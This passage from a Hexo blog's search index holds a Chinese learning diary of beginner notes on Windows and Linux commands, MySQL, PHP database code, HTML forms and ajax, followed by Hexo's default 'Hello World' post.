html&gt;//判断表单字段fname是否存在,不存在则阻止提交&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;function validateForm() &#123;    var x = document.forms[&quot;myForm&quot;][&quot;fname&quot;].value;    if (x == null || x == &quot;&quot;) &#123;        alert(&quot;需要输入名字。&quot;);        return false;    &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;myForm&quot; action=&quot;demo_form.php&quot;//action:提交到服务器的文件onsubmit=&quot;return validateForm()&quot; method=&quot;post&quot;&gt;//method:get 或者post post用于提交加密信息,不在url显示名字: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">10</span>. javascript<br><br><span class="hljs-comment">## 10.14</span><br><br><span class="hljs-number">1</span>. 环境配置与安装<br><span class="hljs-number">2</span>. windows <br>   - cd 切换目录<br>   - dir 显示目录和文件<br>   - md mkdir 创建文件夹<br>   - rd 删除目录<br>   - move 移动目录,重命名目录<br>   - copy source destination 复制文件<br>   - xcopy 复制目录<br>   - del 删除文件<br>   - type 显示文件内容<br>   - findstr 查找文件内容 <br>   - <span class="hljs-string">&quot;&gt;&quot;</span> 重定向 <span class="hljs-string">&quot;|&quot;</span> 管道符 将前面的执行结果作为后面的操作对象<br><span class="hljs-number">3</span>. 自动获取<br><br><span class="hljs-comment">## 10.15</span><br><br><span class="hljs-number">1</span>. tracert 跃点跟踪<br><span class="hljs-number">2</span>. route 操作路由表<br><span class="hljs-number">3</span>. windows管理组<br>   - net localgroup 技术部 /add  <span class="hljs-comment">#创建组</span><br><span class="hljs-number">4</span>. ntfs 文件系统<br><span class="hljs-number">5</span>. 本地安全策略<br><span class="hljs-number">6</span>. 注册表基础<br>   - 注册表是os,硬件设备以及客户程序得以正常运行和保存设置的核心<span class="hljs-string">&quot;数据库&quot;</span><br>   - HKEY_LOCAL_MACHINE  HKEY_USERS <br><span class="hljs-number">7</span>. 计算机网络 物理层 数据链路层 网络层 传输层 应用层 <br><span class="hljs-number">8</span>. wireshark使用<br><br><span class="hljs-comment">## 10.16</span><br><br><span class="hljs-number">1</span>. http协议<br><br><span class="hljs-number">2</span>. linux操作基础<br><br>   - ln f1 f2创建硬链接文件f2  一个文件有多个有效路径名<br>   - ln -s f1 f3创建软连接文件f3 软连接中的文本文件,包含的是另一文件的位置信息,删除f1,f3链接失效<br><br><span class="hljs-number">3</span>. yum操作 <br><br>   - yum search: 搜索安装包<br>   - yum <span class="hljs-keyword">list</span>:已安装包<br>   - yum repolist:列出当前库<br>   - yum install:安装<br>   - yum deplist:查看依赖包<br>   - apt操作类似<br><br><span class="hljs-number">4</span>. mysql 数据库<br><br>   - ```php<br>     <span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br>     <span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br>     <span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br>     <span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br>     <span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>     &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接错误: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>     &#125;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&lt;br /&gt;&#x27;</span>;<br>     <span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;CREATE DATABASE RUNOOB&#x27;</span>;<br>     <span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span> );<br>     <span class="hljs-keyword">if</span>(! <span class="hljs-variable">$retval</span> )<br>     &#123;<br>         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;创建数据库失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>     &#125;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库 RUNOOB 创建成功\n&quot;</span>;<br>     <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br>     <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mysqli<span class="hljs-constructor">_connect(<span class="hljs-params">host</span>, <span class="hljs-params">username</span>, <span class="hljs-params">password</span>, <span class="hljs-params">dbname</span>,<span class="hljs-params">port</span>, <span class="hljs-params">socket</span>)</span>;<br><span class="hljs-comment">//连接成功后返回mysql连接标识符</span><br>mysqli<span class="hljs-constructor">_query(<span class="hljs-params">connection</span>,<span class="hljs-params">query</span>,<span class="hljs-params">resultmode</span>)</span>;<br><span class="hljs-comment">//针对成功的 SELECT、SHOW、DESCRIBE 或 EXPLAIN 查询，将返回一个 mysqli_result 对象。针对其他成功的查询，将返回 TRUE。如果失败，则返回 FALSE</span><br></code></pre></td></tr></table></figure></li></ul></li><li><pre><code class="hljs">root@host# mysql -u root -pEnter password:*******mysql&gt; use RUNOOB;Database changedmysql&gt; CREATE TABLE runoob_tbl(   -&gt; runoob_id INT NOT NULL AUTO_INCREMENT,   -&gt; runoob_title VARCHAR(100) NOT NULL,   -&gt; runoob_author VARCHAR(40) NOT NULL,   -&gt; submission_date DATE,   -&gt; PRIMARY KEY ( runoob_id )   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;Query OK, 0 rows affected (0.16 sec)mysql&gt; //创建数据表<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">6</span>. ```<br>   <span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br>   <span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br>   <span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br>   <span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br>   <span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>   &#123;<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>   &#125;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&lt;br /&gt;&#x27;</span>;<br>   <span class="hljs-comment">// 设置编码，防止中文乱码</span><br>   <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span> , <span class="hljs-string">&quot;set names utf8&quot;</span>);<br>    <br>   <span class="hljs-variable">$runoob_title</span> = <span class="hljs-string">&#x27;学习 Python&#x27;</span>;<br>   <span class="hljs-variable">$runoob_author</span> = <span class="hljs-string">&#x27;RUNOOB.COM&#x27;</span>;<br>   <span class="hljs-variable">$submission_date</span> = <span class="hljs-string">&#x27;2016-03-06&#x27;</span>;<br>    <br>   <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO runoob_tbl &quot;</span>.<br>           <span class="hljs-string">&quot;(runoob_title,runoob_author, submission_date) &quot;</span>.<br>           <span class="hljs-string">&quot;VALUES &quot;</span>.<br>           <span class="hljs-string">&quot;(&#x27;<span class="hljs-subst">$runoob_title</span>&#x27;,&#x27;<span class="hljs-subst">$runoob_author</span>&#x27;,&#x27;<span class="hljs-subst">$submission_date</span>&#x27;)&quot;</span>;<br>    <br>    <br>    <br>   <span class="hljs-title function_ invoke__">mysqli_select_db</span>( <span class="hljs-variable">$conn</span>, <span class="hljs-string">&#x27;RUNOOB&#x27;</span> );<br>   <span class="hljs-variable">$retval</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>( <span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span> );<br>   <span class="hljs-keyword">if</span>(! <span class="hljs-variable">$retval</span> )<br>   &#123;<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;无法插入数据: &#x27;</span> .<br>     <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$conn</span>));<br>   &#125;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据插入成功\n&quot;</span>;<br>   <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br>   <span class="hljs-meta">?&gt;</span><br>   <span class="hljs-comment">//对于含有中文的数据插入,要先设置编码mysqli_query($conn , &quot;set names utf8&quot;);</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>select col1,col2<br>from table_name</p><p>[where clause(字句)]</p><p>[limit n] [offset m]</p></li><li><p>select –&gt;where –&gt; group by–&gt; having–&gt;order by</p></li></ol><h2 id="10-17"><a href="#10-17" class="headerlink" title="10.17"></a>10.17</h2><ol><li><p>inner join</p></li><li><p>insert into table_name(field1,2,3) values(value1,2,3)</p></li><li><p>alter命令</p><ul><li><p>mysql&gt; ALTER TABLE testalter_tbl  DROP i; &#x2F;&#x2F;删除表中i字段</p></li><li><p>mysql&gt; ALTER TABLE testalter_tbl ADD i INT; &#x2F;&#x2F;add子句在数据表中添加列</p></li><li><p>mysql&gt; ALTER TABLE testalter_tbl ADD INDEX (c);&#x2F;&#x2F;表中添加索引</p></li><li><p>mysql&gt; ALTER TABLE testalter_tbl MODIFY i INT NOT NULL; </p><p>mysql&gt; ALTER TABLE testalter_tbl ADD PRIMARY KEY (i);  &#x2F;&#x2F;两条语句添加主键,主键不能为null</p></li></ul></li><li><p>获取服务器元数据</p><table><thead><tr><th>SELECT VERSION( )</th><th>服务器版本信息</th></tr></thead><tbody><tr><td>SELECT DATABASE( )</td><td>当前数据库名 (或者返回空)</td></tr><tr><td>SELECT USER( )</td><td>当前用户名</td></tr><tr><td>SHOW STATUS</td><td>服务器状态</td></tr><tr><td>SHOW VARIABLES</td><td>服务 器配置变量</td></tr></tbody></table></li></ol><h4 id="php开发基础"><a href="#php开发基础" class="headerlink" title="php开发基础"></a>php开发基础</h4><ol><li>php开发环境配置</li></ol><h2 id="10-18"><a href="#10-18" class="headerlink" title="10.18"></a>10.18</h2><ol><li><p>正则表达式匹配 </p><ul><li><p>php正则替换  preg_match_all($pattern,$source,$result);</p><p>$pattern: 正则表达式 $source:匹配源 $result:匹配结果,数组储存</p></li><li><p>数组遍历 foreach ($array as $var){   }</p></li></ul></li><li><p>前后端交互</p><ul><li>资源获取型:get请求+url</li><li>数据获取型:post请求+url+请求正文</li><li>ajax提交:无刷新提交数据给后台</li></ul></li><li><p>post请求</p><ol><li>form 标签包裹表单元素</li><li>form标签中指定action属性 url地址</li><li>form标签中指定method方法为post</li><li>form标签内,有一个提交按钮</li></ol></li><li><p>ajax</p><ol><li><script type="text/javascript" src="min.js"></script></li><li><p>三步走:&#x2F;&#x2F;获取表单元素的值 通过字符串拼接为一个请求正文 利用ajax发送post请求,并获取响应 <img src="/2022/10/08/learning-diary/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221018182235714.png" alt="image-20221018182235714"></p></li></ol></li><li><p>php mysql操作</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$conn</span>=<span class="hljs-built_in">mysqli_connect</span>(hostname,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;learn&quot;</span>)<br><span class="hljs-comment">//设置编码格式</span><br><span class="hljs-function"><span class="hljs-title">mysqli_query</span><span class="hljs-params">(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>)</span></span><br></code></pre></td></tr></table></figure></li></ol><h2 id="10-19"><a href="#10-19" class="headerlink" title="10.19"></a>10.19</h2><h4 id="沃囸你哥"><a href="#沃囸你哥" class="headerlink" title="沃囸你哥"></a>沃囸你哥</h4><ol><li>数据库约束和范式<ul><li>外键:a表里面某一列引用另一张b表的主键,则a表中的列叫外键</li><li>范式,约束性和完整性要求等越来越高</li></ul></li><li>分组查询,子查询,多级查询,比如:将上级查询内容用作下级查询内容中where限制子句</li><li>多表连接查询 tablea join tableb on 条件;</li><li>left join 以左表为重</li></ol><h3 id="看文章资料然后再自己实践-看视频效率太低了"><a href="#看文章资料然后再自己实践-看视频效率太低了" class="headerlink" title="看文章资料然后再自己实践,看视频效率太低了!!!!"></a>看文章资料然后再自己实践,看视频效率太低了!!!!</h3><p>another  page~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/10/hello-world/"/>
    <url>/2022/09/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
